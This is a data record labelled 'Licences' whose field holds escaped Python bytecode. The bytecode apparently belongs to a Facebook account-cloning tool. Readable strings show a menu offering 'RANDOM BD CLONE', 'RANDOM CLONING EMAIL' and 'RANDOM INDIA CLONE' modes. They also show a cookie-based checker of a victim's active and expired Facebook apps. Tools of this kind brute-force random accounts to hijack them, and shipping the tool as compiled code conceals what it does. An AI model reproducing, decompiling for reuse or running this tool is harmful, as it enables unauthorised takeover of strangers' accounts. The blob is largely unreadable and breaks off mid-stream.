Licences,"c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\xf38\x05\x00\x00\x97\x00|\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01d\x02|\x01i\x01\xac\x03\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x02t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x02d\x04\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00}\x03\x02\x00|\x03j\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x05d\x06\xac\x07\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00}\x04d\x08\x84\x00|\x04\xa0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x05t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\nk\x02\x00\x00\x00\x00r:t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0bt\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0c\x9d\x03t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00f\x05z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\xa8t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\rt\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00\x9d\x02t\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00]H}\x06t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0et\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x0f\x9d\x03t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x06d\x10z\x00\x00\x00|\x05|\x06\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x11d\x12\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00f\x04z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8cIt\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x13t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00f\x03z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00|\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x14d\x02|\x01i\x01\xac\x03\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x02t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x02d\x04\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00}\x03\x02\x00|\x03j\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x05d\x06\xac\x07\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00}\x04d\x15\x84\x00|\x04\xa0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x05t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\nk\x02\x00\x00\x00\x00r2t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x16t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00f\x05z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x17t\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00\x9d\x02t\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00]?}\x06t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x18t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x06d\x10z\x00\x00\x00|\x05|\x06\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x19d\x1a\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00f\x04z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8c@t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x01d\x1bt\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x01d\x1bt\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x01\x9d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00)\x1cNz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=active\xda\x06cookie)\x01\xda\x07cookiesz\x0bhtml.parser\xda\x04form\xda\x04post)\x01\xda\x06methodc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x13\x00\x00\x00\xf3\x1c\x00\x00\x00\x97\x00g\x00|\x00]\t}\x01|\x01j\x00\x00\x00\x00\x00\x00\x00\x00\x00\x91\x02\x8c\nS\x00r\x80\x00\x00\x00\xa9\x01rb\x00\x00\x00\xa9\x02\xda\x02.0rl\x00\x00\x00s\x02\x00\x00\x00  rl\x00\x00\x00\xfa\n<listcomp>z\x1bcek_apk.<locals>.<listcomp>;\x01\x00\x00\xf3\x1a\x00\x00\x00\x80\x00\xd0\x0b-\xd0\x0b-\xd0\x0b-\x90q\x88A\x8cF\xd0\x0b-\xd0\x0b-\xd0\x0b-rz\x00\x00\x00\xda\x02h3r\x02\x00\x00\x00z\x02%su3\x00\x00\x00[%s\xc3\x97%s] %sSorry there is no Active  Apk%s         u(\x00\x00\x00[\xf0\x9f\x94\xa5] %s \xe2\x98\x86 Your Active Apps \xe2\x98\x86     :z\x07[%s%s] z\x05%s %sr\x17\x00\x00\x00z\x10Ditambahkan padaz\x11 Ditambahkan padaz2\r %s[%s!%s] Sorry, Apk check failed invalid cookiez>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivec\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x13\x00\x00\x00\xf3\x1c\x00\x00\x00\x97\x00g\x00|\x00]\t}\x01|\x01j\x00\x00\x00\x00\x00\x00\x00\x00\x00\x91\x02\x8c\nS\x00r\x80\x00\x00\x00r\x93\x00\x00\x00r\x94\x00\x00\x00s\x02\x00\x00\x00  rl\x00\x00\x00r\x96\x00\x00\x00z\x1bcek_apk.<locals>.<listcomp>G\x01\x00\x00r\x97\x00\x00\x00rz\x00\x00\x00z<%s[%s!%s] %sSorry there is no Expired Apk%s                \nu\'\x00\x00\x00[\xe2\x9c\x94] %s \xe2\x98\x91 Your Expired Apps \xe2\x98\x91    :z\x0c[%s%s] %s %s\xda\x0bKedaluwarsaz\x0c Kedaluwarsau?\x00\x00\x00\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90)\x10ra\x00\x00\x00rb\x00\x00\x00r\x06\x00\x00\x00\xda\x04find\xda\x08find_all\xda\x03lenr\x85\x00\x00\x00rA\x00\x00\x00r?\x00\x00\x00r>\x00\x00\x00r3\x00\x00\x00\xda\x05GREEN\xda\x05ranger9\x00\x00\x00\xda\x07replace\xda\x05WHITE)\x07\xda\x07session\xda\x04cokirY\x00\x00\x00\xda\x03sop\xda\x01x\xda\x04gamerl\x00\x00\x00s\x07\x00\x00\x00       rl\x00\x00\x00\xda\x07cek_apkr\xa7\x00\x00\x007\x01\x00\x00s\xa8\x02\x00\x00\x80\x00\xd8\x06\r\x87k\x82k\xd0\x12P\xd0Zb\xd0cg\xd0Yh\x80k\xd1\x06i\xd4\x06i\xd4\x06n\x80A\xdd\n\x17\x98\x01\x98-\xd1\n(\xd4\n(\x80C\xd8\x08\x10\x88\x03\x8c\x08\x90\x16\x98v\xd0\x08&\xd1\x08&\xd4\x08&\x80A\xd8\x0b-\xd0\x0b-\x98A\x9fJ\x9aJ\xa0t\xd1\x1c,\xd4\x1c,\xd0\x0b-\xd1\x0b-\xd4\x0b-\x80D\xdd\x07\n\x884\x81y\x84y\x90!\x82|\x80|\xdd\x08\r\xd0\x0eI\x951\xd0\x0eI\xd0\x0eI\xd0\x0eI\xcd1\xcdQ\xcdq\xd5QR\xd5ST\xc8+\xd1\x0eU\xd1\x08V\xd4\x08V\xd0\x08V\xd0\x08V\xe5\x08\r\xd0\x0e<\xbd\x11\xd0\x0e<\xd0\x0e<\xbde\xd1\x0eD\xd1\x08E\xd4\x08E\xd0\x08E\xdd\x11\x16\x95s\x984\x91y\x94y\xd1\x11!\xd4\x11!\xf0\x00\x03\tR\x01\xf0\x00\x03\tR\x01\x88A\xdd\x0c\x11\xd0\x12$\x9dA\xd0\x12$\xd0\x12$\xd0\x12$\xa5a\xa8\x01\xa8!\xa9\x03\xa8D\xb0\x11\xacG\xafO\xaaO\xd0<N\xd0Ob\xd1,c\xd4,c\xd5de\xd0%f\xd1\x12f\xd1\x0cg\xd4\x0cg\xd0\x0cg\xd0\x0cg\xe5\x0c\x11\xd0\x12H\xcd!\xcdA\xcda\xc8\x17\xd1\x12P\xd1\x0cQ\xd4\x0cQ\xd0\x0cQ\xd8\x06\r\x87k\x82k\xd0\x12R\xd0\\d\xd0ei\xd0[j\x80k\xd1\x06k\xd4\x06k\xd4\x06p\x80A\xdd\n\x17\x98\x01\x98-\xd1\n(\xd4\n(\x80C\xd8\x08\x10\x88\x03\x8c\x08\x90\x16\x98v\xd0\x08&\xd1\x08&\xd4\x08&\x80A\xd8\x0b-\xd0\x0b-\x98A\x9fJ\x9aJ\xa0t\xd1\x1c,\xd4\x1c,\xd0\x0b-\xd1\x0b-\xd4\x0b-\x80D\xdd\x07\n\x884\x81y\x84y\x90!\x82|\x80|\xdd\x08\r\xd0\x0eN\xd5PQ\xd5RS\xd5TU\xd5VW\xd5XY\xc8{\xd1\x0eZ\xd1\x08[\xd4\x08[\xd0\x08[\xd0\x08[\xd0\x08[\xe5\x08\r\xd0\x0e?\xbd\x05\xd0\x0e?\xd0\x0e?\xc5\x11\xd1\x0eC\xd1\x08D\xd4\x08D\xd0\x08D\xdd\x11\x16\x95s\x984\x91y\x94y\xd1\x11!\xd4\x11!\xf0\x00\x03\tb\x02\xf0\x00\x03\tb\x02\x88A\xdd\x0c\x11\x90/\xa51\xa0Q\xa0q\xa1S\xa8\x14\xa8a\xac\x17\xaf\x1f\xaa\x1f\xb8\x1d\xc0~\xd1)V\xd4)V\xd5WX\xd0"Y\xd1\x12Y\xd1\x0cZ\xd4\x0cZ\xd0\x0cZ\xd0\x0cZ\xe5\x0c\x11\xf5\x00\x00[\x02\\\x02\xf0\x00\x00[\x02\\\x02\xf0\x00\x00[\x02\\\x02\xf5\x00\x00]\x02^\x02\xf0\x00\x00]\x02^\x02\xf0\x00\x00]\x02^\x02\xf5\x00\x00_\x02`\x02\xf0\x00\x00_\x02`\x02\xf0\x00\x00\x13a\x02\xf1\x00\x00\rb\x02\xf4\x00\x00\rb\x02\xf0\x00\x00\rb\x02\xf0\x00\x00\rb\x02\xf0\x00\x00\rb\x02rz\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\xf3x\x03\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0b\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x00|\x00d\x0ck\x02\x00\x00\x00\x00r"t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00|\x00d\x0ek\x02\x00\x00\x00\x00r"t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00|\x00d\x0fk\x02\x00\x00\x00\x00r"t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00|\x00d\x10k\x02\x00\x00\x00\x00r"t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00|\x00d\x11k\x02\x00\x00\x00\x00r"t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00|\x00d\x12k\x02\x00\x00\x00\x00r$t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x13\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00d\x00S\x00)\x14Nr\x04\x00\x00\x00\xfa.\x1b[1;34m---------------------------------------z:\x1b[1;92m[\x1b[92;1m1\x1b[1;92m]\x1b[1;92m RANDOM BD CLONE APK [FIRE]z9\x1b[1;92m[\x1b[92;1m2\x1b[1;92m]\x1b[1;92m RANDOM BD CLONE OK [BEST]z>\x1b[1;92m[\x1b[92;1m3\x1b[1;92m]\x1b[1;92m RANDOM BD CLONE MIX [WORKING] z<\x1b[1;92m[\x1b[92;1m4\x1b[1;92m]\x1b[1;92m RANDOM CLONING  EMAIL [FIRE]z@\x1b[1;92m[\x1b[92;1m5\x1b[1;92m]\x1b[1;92m RANDOM INDIA CLONE [NOT TESTED] z2\x1b[1;92m[\x1b[92;1m6\x1b[1;92m]\x1b[1;92m CONTACT TO ADMIN  z&\x1b[1;92m[\x1b[92;1m7\x1b[1;92m]\x1b[1;91m EXIT  \xda\x00z,\x1b[0;97m[\x1b[38;5;208m?\x1b[0;97m]\x1b[0;97mCHOOSE : \xda\x011rQ\x00\x00\x00\xda\x012r&\x00\x00\x00r\'\x00\x00\x00r(\x00\x00\x00r)\x00\x00\x00r\x05\x00\x00\x00)\nr~\x00\x00\x00r\x7f\x00\x00\x00r\x86\x00\x00\x00r\x85\x00\x00\x00\xda\x05input\xda\nrandom_apk\xda\x04menu\xda\nrandom_MIX\xda\x0crandom_gmail\xda\x04main)\x01\xda\x02shs\x01\x00\x00\x00 rl\x00\x00\x00r\xb2\x00\x00\x00r\xb2\x00\x00\x00W\x01\x00\x00s\x86\x01\x00\x00\x80\x00\xdd\x04\x06\x84I\x88g\xd1\x04\x16\xd4\x04\x16\xd0\x04\x16\xdd\x04\n\x81H\x84H\x80H\xf5\n\x00\x05\n\xd0\n=\xd1\x04>\xd4\x04>\xd0\x04>\xdd\x04\t\xd0\nS\xd1\x04T\xd4\x04T\xd0\x04T\xdd\x04\t\xd0\nR\xd1\x04S\xd4\x04S\xd0\x04S\xdd\x04\t\xd0\nW\xd1\x04X\xd4\x04X\xd0\x04X\xdd\x04\t\xd0\nU\xd1\x04V\xd4\x04V\xd0\x04V\xdd\x04\t\xd0\nY\xd1\x04Z\xd4\x04Z\xd0\x04Z\xdd\x04\t\xd0\nK\xd1\x04L\xd4\x04L\xd0\x04L\xdd\x04\t\xd0\n?\xd1\x04@\xd4\x04@\xd0\x04@\xdd\x04\t\xd0\n=\xd1\x04>\xd4\x04>\xd0\x04>\xdd\x04\t\x88"\x81I\x84I\x80I\xe5\t\x0e\xd0\x0fI\xd1\tJ\xd4\tJ\x80B\xd8\x07\t\x88C\x82x\x80x\xdd\x07\t\x84y\x90\x13\x81~\x84~\x80~\xdd\x07\x11\x81|\x84|\x80|\xd8\x07\t\x88C\x82x\x80x\xdd\x07\t\x84y\x90\x13\x81~\x84~\x80~\xdd\x07\x0b\x81v\x84v\x80v\xd8\x07\t\x88C\x82x\x80x\xdd\x07\t\x84y\x90\x13\x81~\x84~\x80~\xdd\x07\x11\x81|\x84|\x80|\xd8\x07\t\x88C\x82x\x80x\xdd\x07\t\x84y\x90\x13\x81~\x84~\x80~\xdd\x07\x13\x81~\x84~\x80~\xd8\x07\t\x88C\x82x\x80x\xdd\x07\t\x84y\x90\x13\x81~\x84~\x80~\xdd\x07\x0b\x81v\x84v\x80v\xd8\x07\t\x88C\x82x\x80x\xdd\x07\t\x84y\xd0\x11K\xd1\x07L\xd4\x07L\xd0\x07L\xdd\x07\x0b\x81v\x84v\x80v\x80v\x80v\xf0\x05\x00\x08\x10\x80xrz\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\xf3\x9e\x01\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x00|\x00d\x07k\x02\x00\x00\x00\x00r\x10t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00|\x00d\x08k\x02\x00\x00\x00\x00r\x10t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00|\x00d\tk\x02\x00\x00\x00\x00r\x10t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00)\x0bNr\x04\x00\x00\x00z\x1a\x1b[97;1m[1] Method 1 [Fire]z\x1a\x1b[97;1m[2] Method 2 [Best]z\x1d\x1b[97;1m[3] Method 3 [Working]\xda2__________________________________________________u\x19\x00\x00\x00\x1b[97;1m[\xe2\x88\x9a] SELECT OPT: r\xab\x00\x00\x00r\xac\x00\x00\x00r&\x00\x00\x00z"\n\x1b[1;31mChoose valid option\x1b[0;97m)\tr~\x00\x00\x00r\x7f\x00\x00\x00r\x86\x00\x00\x00r\x85\x00\x00\x00r\xad\x00\x00\x00\xda\x0erandom_number1\xda\x0erandom_number2\xda\x0erandom_number3r\xaf\x00\x00\x00)\x01\xda\x03opts\x01\x00\x00\x00 rl\x00\x00\x00r\xaf\x00\x00\x00r\xaf\x00\x00\x00\x7f\x01\x00\x00s\xd0\x00\x00\x00\x80\x00\xdd\x01\x03\x84\x19\x887\xd1\x01\x13\xd4\x01\x13\xd0\x01\x13\xdd\x01\x07\x81\x18\x84\x18\x80\x18\xdd\x01\x06\xd0\x07&\xd1\x01\'\xd4\x01\'\xd0\x01\'\xdd\x01\x06\xd0\x07&\xd1\x01\'\xd4\x01\'\xd0\x01\'\xdd\x01\x06\xd0\x07)\xd1\x01*\xd4\x01*\xd0\x01*\xdd\x01\x06\x80v\x81\x1d\x84\x1d\x80\x1d\xdd\x07\x0c\xd0\r+\xd1\x07,\xd4\x07,\x80\x13\xd8\x04\x07\x88#\x82I\x80I\xdd\x02\x10\xd1\x02\x12\xd4\x02\x12\xd0\x02\x12\xd0\x02\x12\xd0\x02\x12\xd8\x06\t\x88C\x82i\x80i\xdd\x02\x10\xd1\x02\x12\xd4\x02\x12\xd0\x02\x12\xd0\x02\x12\xd0\x02\x12\xd8\x06\t\x88C\x82i\x80i\xdd\x02\x10\xd1\x02\x12\xd4\x02\x12\xd0\x02\x12\xd0\x02\x12\xd0\x02\x12\xf5\x06\x00\x03\x08\xd0\x083\xd1\x024\xd4\x024\xd0\x024\xdd\x02\x06\x81&\x84&\x80&\x80&\x80&rz\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x03\x00\x00\x00\xf3<\x08\x00\x00\x97\x00g\x00}\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x03t\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x04t\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x05\x9d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x08\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05t\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x08\x9d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\